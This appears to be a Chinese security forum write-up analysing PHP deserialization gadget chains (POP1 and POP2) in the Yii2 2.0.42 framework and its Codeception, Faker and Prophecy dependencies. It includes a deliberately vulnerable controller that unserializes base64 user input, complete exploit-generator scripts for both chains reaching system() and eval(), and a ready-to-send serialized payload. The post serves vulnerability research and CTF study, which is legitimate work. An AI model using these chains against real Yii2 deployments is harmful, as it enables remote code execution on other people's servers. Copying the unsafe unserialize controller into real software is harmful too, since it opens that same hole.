### 环境搭建

<https://github.com/yiisoft/yii2-app-basic/releases> 官方最新版本已经更新到2.0.43,直接github拉取的项目会缺少一部分文件，所以还是用composer进行下载

```php
composer create-project --prefer-dist yiisoft/yii2-app-basic yii2
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-678ca1c22e7015ca4c1e4042bee52748e8b080a9.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-678ca1c22e7015ca4c1e4042bee52748e8b080a9.png)  
反序列化入口文件代码还是老样子

```php
<?php
/***
 * Created by joker
 * Date 2021/9/5 23:47
 ***/

namespace app\controllers;
use Yii;
use yii\web\Controller;

class AxinController extends \yii\web\Controller
{
    public function actionDeser($data)
    {
        return unserialize(base64_decode($data));
    }
}

```

### 漏洞分析

全局搜索`__destruct`魔术方法，2.0.38版本之前的几条链子的入口都还在，但是每一个对应的文件都添加了一个`__wakeup`魔术方法来修补了反序列化的漏洞  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8a2b9f7ee38f1acbed1aeb9fd36daeae8f3f1bbf.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8a2b9f7ee38f1acbed1aeb9fd36daeae8f3f1bbf.png)  
手上的版本是2.0.43的，而漏洞在2.0.42版本，确定了漏洞起点，临时注释掉2.0.43修补2.0.42版本反序列化增加的`__wakeup`魔术方法即可

#### POP1

`vendor\codeception\codeception\ext\RunProcess.php`，在2.0.42版本中只有这个类是没有加上上面的修补反序列化的代码的  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-fc6df7b8367b6e5d5701f79ffd15188cb5b4841d.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-fc6df7b8367b6e5d5701f79ffd15188cb5b4841d.png)  
思路还是差不多，反序列化时触发`stopProcess()`方法，方法中`array_reverse`会对`$this->processes`数组变量进行翻转，这里只需传递单个数组值就可以，下面就是找跳板,全局搜索定位`__call()`魔术方法  
`vendor\fakerphp\faker\src\Faker\ValidGenerator.php`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-2f78dcd57dc083723be4061802500b59f49b26fc.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-2f78dcd57dc083723be4061802500b59f49b26fc.png)  
do,while循环语句，不管判断条件是否成立，do中的语句都会执行一次，`$this->generator`可控，`$this->validato`r也可控，只需要`$res`可控，那么就可以达到RCE的效果，`call_user_func_array`在这里只能当作跳板，调用任意类的任意方法，需要再找一个`__call()`魔术方法，并且返回结果可控的；继续全局搜索`__call()`  
`vendor\fakerphp\faker\src\Faker\DefaultGenerator.php`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-322b41ea5744c65c63bdb465978533d98078007d.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-322b41ea5744c65c63bdb465978533d98078007d.png)  
`$this->default`变量完全可控，那也就意味着`$res`可控,也就可以RCE了，链子串一串exp也就出来了，因为exp中弹的计算器，所以$this-&gt;maxRetries在赋值的时候要写小一点

```php
<?php
/***
 * Created by joker
 * Date 2021/9/7 16:35
 ***/
namespace Faker;
class DefaultGenerator{
    protected $default;
    function __construct()
    {
        $this->default = 'calc.exe';
    }
}
class ValidGenerator{
    protected $generator;
    protected $validator;
    protected $maxRetries;
    function __construct()
    {
        $this->generator = new DefaultGenerator();
        $this->maxRetries = '10';
        $this->validator = 'system';
    }
}

namespace Codeception\Extension;
use Faker\ValidGenerator;
class RunProcess{
    private $processes;
    function __construct()
    {
        $this->processes = [new ValidGenerator()];
    }
}
echo base64_encode(serialize(new RunProcess()));
```

生成一下payload，打一下,谈了10个计算器哈哈哈  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-9a55ddec34545662c611fc1d4250dfb45dfe1f81.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-9a55ddec34545662c611fc1d4250dfb45dfe1f81.png)

#### POP2

pop2这条链就是当时比赛那道题的考察点，应该是YII所有反序列化中最为复杂的一条利用链了，分析一波，分析完会发现这条链真的是运气所致，一切都是那么正正好  
起手点还是pop1中提到的那里，就不看了，直接来看定位到的另一处`__call`魔术方法  
这里的跳板选择了`vendor\phpspec\prophecy\src\Prophecy\Prophecy\ObjectProphecy.php`中的`__call()魔术方法`,看断点处  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c191d3c2840ee51fe4d9752e633606f1fb84c511.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c191d3c2840ee51fe4d9752e633606f1fb84c511.png)  
在本类中存在一个`reveal`方法，如果不使用本类的该方法会自动调用其他类中的该方法，仔细跟进完会发现那样子走pop链是利用不起来的，所以只能让`$this->revealer`为该类的一个实例来调用类中的该方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-5280e4b3e5788c3a09690d2a33fd8c5745acd289.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-5280e4b3e5788c3a09690d2a33fd8c5745acd289.png)  
`$this->lazyDouble`可控，赋值为存在`getInstance()`的类对象，跟进`getInstance()`方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-2337d26d321f88d329bd6699d57751b8cb967e98.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-2337d26d321f88d329bd6699d57751b8cb967e98.png)  
`$this->double`和`$this->arguments`都可控，此处进步进入if判断的语句都没有区别，最后调用的方法都是一样的，`$this->doubler`可控，跟进`double`方法，确认存在该方法的类，再对`$this->doubler`进行实例化类赋值即可，`$this->class`和`$this->interfaces`的赋值需要根据`double`方法的参数类型来确定  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8c311d504e1cdda8d3d3cffb62a9030a56f03e87.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8c311d504e1cdda8d3d3cffb62a9030a56f03e87.png)  
这里需要提一下`ReflectionClass`类，该类是PHP中的反射类，通过`new ReflectionClass($classname)`可以构建一个类的反射类，这里的if判断中会判断`$interface`是否是该反射类的实例化对象或者是否实现了该类中的某个接口。都知道的php有一个异常处理类`Exception`，用`ReflectionClass`类构建异常处理类的反射类，就能够避免上面代码中异常抛出，程序也就能够走到断点处了。验证这一想法，本地写一个小例子  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6a5705be4f69267dbc2c9d0e76c69c1f6e64551b.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6a5705be4f69267dbc2c9d0e76c69c1f6e64551b.png)  
所以到这里，前面留下的几个参数赋值到这里就能够解决了

```php
$this->class = new \ReflectionClass('Exception');
$this->argument = array('joker'=>'joker');//数组内容随意填写，无影响
$this->interfaces[] = new \ReflectionClass('Exception');
```

接着跟进`createDoubleClass`方法  
`vendor\phpspec\prophecy\src\Prophecy\Doubler\Doubler.php`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-a120b9fdbf2ac2780b92020e2a5655d9555735f0.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-a120b9fdbf2ac2780b92020e2a5655d9555735f0.png)  
主要的利用部分在断点处，`$name`和`$node`，根据代码逻辑来看是不可控的参数，这里就要用到POP1中后面的跳板方法，只需要让`$this->namer`和`$this->mirror`实例化为`DefaultGenerator`类对象就可以了，这里的`$this->patch`参数不需要管，并不影响代码执行到断点处。  
跟`create`方法，确认`$name`和`$node`参数类型  
`vendor\phpspec\prophecy\src\Prophecy\Doubler\Generator\ClassCreator.php`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-62021fe99b16d0dfa9be7134134c523b94b1223b.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-62021fe99b16d0dfa9be7134134c523b94b1223b.png)  
根据方法中的参数来看，$node需要为`Node\ClassNode`类对象  
这里最后利用的点为断点处，可以插入代码执行，还是用同样的方法来使得`$code`可控，实例化为`DefaultGenerator`类对象  
这个链到这里就完整了，把链捋一捋串一串，exp也就出来了，不是特别好写，多点耐心

```php
<?php
/***
 * Created by joker
 * Date 2021/9/7 20:02
 ***/
namespace Codeception\Extension;
use Prophecy\Prophecy\ObjectProphecy;
class RunProcess{
    private $processes;
    function __construct()
    {
        $a = new ObjectProphecy('1');
        $this->processes[] = new ObjectProphecy($a);
    }
}
echo base64_encode(serialize(new RunProcess()));
namespace Prophecy\Prophecy;
use Prophecy\Doubler\LazyDouble;
class ObjectProphecy{
    private $lazyDouble;
    private $revealer;
    function __construct($a)
    {
        $this->revealer = $a;
        $this->lazyDouble = new LazyDouble();
    }
}

namespace Prophecy\Doubler;
class LazyDouble{
    private $doubler;
    private $argument;
    private $class;
    private $interfaces;
    function __construct()
    {
        $this->doubler =new Doubler();
        $this->class = new \ReflectionClass('Exception');
        $this->argument = array('joker'=>'joker');
        $this->interfaces[] = new \ReflectionClass('Exception');
    }
}
namespace Prophecy\Doubler\Generator\Node;
class ClassNode{
}

namespace Prophecy\Doubler;
use Prophecy\Doubler\Generator\Node\ClassNode;
use Faker\DefaultGenerator;
use Prophecy\Doubler\Generator\ClassCreator;
class Doubler{
    private $mirror;
    private $creator;
    private $namer;
    function __construct()
    {
        $this->namer = new DefaultGenerator('joker');
        $this->mirror = new DefaultGenerator(new ClassNode());
        $this->creator = new ClassCreator();
    }
}

namespace Faker;
class DefaultGenerator{
protected $default;
    function __construct($default)
    {
        $this->default = $default;
    }
}

namespace Prophecy\Doubler\Generator;
use Faker\DefaultGenerator;
class ClassCreator{
    private $generator;
    function __construct()
    {
        $this->generator = new DefaultGenerator('eval(phpinfo());');
    }
}
```

生成payload

```php
TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MzI6IlByb3BoZWN5XFByb3BoZWN5XE9iamVjdFByb3BoZWN5IjoyOntzOjQ0OiIAUHJvcGhlY3lcUHJvcGhlY3lcT2JqZWN0UHJvcGhlY3kAbGF6eURvdWJsZSI7TzoyNzoiUHJvcGhlY3lcRG91YmxlclxMYXp5RG91YmxlIjo0OntzOjM2OiIAUHJvcGhlY3lcRG91YmxlclxMYXp5RG91YmxlAGRvdWJsZXIiO086MjQ6IlByb3BoZWN5XERvdWJsZXJcRG91YmxlciI6Mzp7czozMjoiAFByb3BoZWN5XERvdWJsZXJcRG91YmxlcgBtaXJyb3IiO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO086NDE6IlByb3BoZWN5XERvdWJsZXJcR2VuZXJhdG9yXE5vZGVcQ2xhc3NOb2RlIjowOnt9fXM6MzM6IgBQcm9waGVjeVxEb3VibGVyXERvdWJsZXIAY3JlYXRvciI7TzozOToiUHJvcGhlY3lcRG91YmxlclxHZW5lcmF0b3JcQ2xhc3NDcmVhdG9yIjoxOntzOjUwOiIAUHJvcGhlY3lcRG91YmxlclxHZW5lcmF0b3JcQ2xhc3NDcmVhdG9yAGdlbmVyYXRvciI7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7czoxNjoiZXZhbChwaHBpbmZvKCkpOyI7fX1zOjMxOiIAUHJvcGhlY3lcRG91YmxlclxEb3VibGVyAG5hbWVyIjtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjEwOiIAKgBkZWZhdWx0IjtzOjU6Impva2VyIjt9fXM6Mzc6IgBQcm9waGVjeVxEb3VibGVyXExhenlEb3VibGUAYXJndW1lbnQiO2E6MTp7czo1OiJqb2tlciI7czo1OiJqb2tlciI7fXM6MzQ6IgBQcm9waGVjeVxEb3VibGVyXExhenlEb3VibGUAY2xhc3MiO086MTU6IlJlZmxlY3Rpb25DbGFzcyI6MTp7czo0OiJuYW1lIjtzOjk6IkV4Y2VwdGlvbiI7fXM6Mzk6IgBQcm9waGVjeVxEb3VibGVyXExhenlEb3VibGUAaW50ZXJmYWNlcyI7YToxOntpOjA7TzoxNToiUmVmbGVjdGlvbkNsYXNzIjoxOntzOjQ6Im5hbWUiO3M6OToiRXhjZXB0aW9uIjt9fX1zOjQyOiIAUHJvcGhlY3lcUHJvcGhlY3lcT2JqZWN0UHJvcGhlY3kAcmV2ZWFsZXIiO086MzI6IlByb3BoZWN5XFByb3BoZWN5XE9iamVjdFByb3BoZWN5IjoyOntzOjQ0OiIAUHJvcGhlY3lcUHJvcGhlY3lcT2JqZWN0UHJvcGhlY3kAbGF6eURvdWJsZSI7TzoyNzoiUHJvcGhlY3lcRG91YmxlclxMYXp5RG91YmxlIjo0OntzOjM2OiIAUHJvcGhlY3lcRG91YmxlclxMYXp5RG91YmxlAGRvdWJsZXIiO086MjQ6IlByb3BoZWN5XERvdWJsZXJcRG91YmxlciI6Mzp7czozMjoiAFByb3BoZWN5XERvdWJsZXJcRG91YmxlcgBtaXJyb3IiO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO086NDE6IlByb3BoZWN5XERvdWJsZXJcR2VuZXJhdG9yXE5vZGVcQ2xhc3NOb2RlIjowOnt9fXM6MzM6IgBQcm9waGVjeVxEb3VibGVyXERvdWJsZXIAY3JlYXRvciI7TzozOToiUHJvcGhlY3lcRG91YmxlclxHZW5lcmF0b3JcQ2xhc3NDcmVhdG9yIjoxOntzOjUwOiIAUHJvcGhlY3lcRG91YmxlclxHZW5lcmF0b3JcQ2xhc3NDcmVhdG9yAGdlbmVyYXRvciI7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7czoxNjoiZXZhbChwaHBpbmZvKCkpOyI7fX1zOjMxOiIAUHJvcGhlY3lcRG91YmxlclxEb3VibGVyAG5hbWVyIjtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjEwOiIAKgBkZWZhdWx0IjtzOjU6Impva2VyIjt9fXM6Mzc6IgBQcm9waGVjeVxEb3VibGVyXExhenlEb3VibGUAYXJndW1lbnQiO2E6MTp7czo1OiJqb2tlciI7czo1OiJqb2tlciI7fXM6MzQ6IgBQcm9waGVjeVxEb3VibGVyXExhenlEb3VibGUAY2xhc3MiO086MTU6IlJlZmxlY3Rpb25DbGFzcyI6MTp7czo0OiJuYW1lIjtzOjk6IkV4Y2VwdGlvbiI7fXM6Mzk6IgBQcm9waGVjeVxEb3VibGVyXExhenlEb3VibGUAaW50ZXJmYWNlcyI7YToxOntpOjA7TzoxNToiUmVmbGVjdGlvbkNsYXNzIjoxOntzOjQ6Im5hbWUiO3M6OToiRXhjZXB0aW9uIjt9fX1zOjQyOiIAUHJvcGhlY3lcUHJvcGhlY3lcT2JqZWN0UHJvcGhlY3kAcmV2ZWFsZXIiO3M6MToiMSI7fX19fQ==

```

打一下  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-0b25d3bca59c5fe1e75859227d84adb053bbd0b6.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-0b25d3bca59c5fe1e75859227d84adb053bbd0b6.png)

#### 后记

归根到底其实也不全是yii框架的原因，跟用的依赖也有关系。  
关于`__wakeup()`魔术方法，在比赛的时候经常遇到，是能够绕过的，但是尝试的时候没有成功，可能跟PHP的版本也有一定的关系，后面有时间再去细究一下。还有两条链，留待下回分析吧。